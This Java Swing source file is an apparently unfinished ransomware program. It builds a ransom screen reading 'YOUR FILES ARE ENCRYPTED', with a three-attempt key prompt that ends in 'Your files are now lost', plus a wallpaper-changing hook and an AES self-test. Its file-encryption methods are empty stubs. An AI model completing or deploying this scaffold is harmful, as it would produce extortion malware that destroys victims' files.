import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;

public class Ransomware extends JFrame {
    private final JPanel mainPanel;
    private JLabel titleLabel;
    private JLabel numberOfAttemptsLabel;
    private JButton validateButton;
    private JTextField keyField;
    private File[] fileNames;
    private AES aes = new AES();
    private int attempts = 3;

    public Ransomware(){
        super("Ransomware");
        this.setSize(Constants.APP_WIDTH, Constants.APP_HEIGHT);
        this.setDefaultCloseOperation(EXIT_ON_CLOSE);
        this.setIconImage(Constants.ICON);
        this.setLocationRelativeTo(null);
        this.setResizable(false);

        this.changeWallpaper();

        mainPanel = new JPanel();
        mainPanel.setLayout(null);
        mainPanel.setSize(Constants.APP_WIDTH, Constants.APP_HEIGHT);
        mainPanel.setBackground(Constants.BLACK);
        this.add(mainPanel);

        titleLabel = new JLabel("YOUR FILES ARE ENCRYPTED");
        titleLabel.setBounds(248, 140, 300, 50);
        titleLabel.setFont(new Font("consolas", Font.BOLD, 15));
        titleLabel.setForeground(Constants.GREEN);
        mainPanel.add(titleLabel);

        numberOfAttemptsLabel = new JLabel("Attempts: " + this.attempts);
        numberOfAttemptsLabel.setBounds(5, 4, 100, 20);
        numberOfAttemptsLabel.setFont(new Font("consolas", Font.BOLD, 12));
        numberOfAttemptsLabel.setForeground(Constants.GREEN);
        mainPanel.add(numberOfAttemptsLabel);

        keyField = new JTextField();
        keyField.setBackground(Constants.DARK_GREY);
        keyField.setForeground(Constants.GREEN);
        keyField.setFont(new Font("consolas", Font.BOLD, 19));
        keyField.setBorder(null);
        keyField.setSelectionColor(Constants.GREEN);
        keyField.setCaretColor(Constants.GREEN);
        keyField.setBounds(245, 200, 200, 30);
        mainPanel.add(keyField);

        validateButton = new JButton("Validate");
        validateButton.setBackground(Constants.DARK_GREY);
        validateButton.setForeground(Constants.GREEN);
        validateButton.setFont(new Font("consolas", Font.BOLD, 12));
        validateButton.setFocusable(false);
        validateButton.setRolloverEnabled(false);
        validateButton.setBorder(null);
        validateButton.setBounds(306, 250, 75, 30);
        validateButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                attempts--;
                checkAttempts();
            }
        });
        mainPanel.add(validateButton);

        // testing AES-256 encryption
        String m1 = this.aes.encrypt("Test");
        System.out.println(m1);
        String m2 = this.aes.decrypt(m1);
        System.out.println(m2);

        this.setVisible(true);
    }

    private void changeWallpaper(){
        try{
            ProcessBuilder pb = new ProcessBuilder("python", new File("src/wp_script.py").getAbsolutePath());
            pb.start();
        }
        catch(IOException e){
            e.printStackTrace();
        }
    }

    private void checkAttempts(){
        switch(this.attempts){
            case 2:
                this.numberOfAttemptsLabel.setText("Attempts: " + this.attempts);
                this.numberOfAttemptsLabel.setForeground(Constants.AMBER);
                this.keyField.setText("");
                break;

            case 1:
                this.numberOfAttemptsLabel.setText("Attempts: " + this.attempts);
                this.numberOfAttemptsLabel.setForeground(Constants.RED);
                this.keyField.setText("");
                break;

            case 0:
                this.numberOfAttemptsLabel.setText("Over");
                this.numberOfAttemptsLabel.setForeground(Constants.GREEN);
                this.keyField.setText("");
                JOptionPane.showMessageDialog(this, "Your files are now lost");
                this.dispose();
        }
    }

    private void encryptFiles(){

    }

    private void decryptFiles(){

    }

    private void setFileNames(){
    }
}
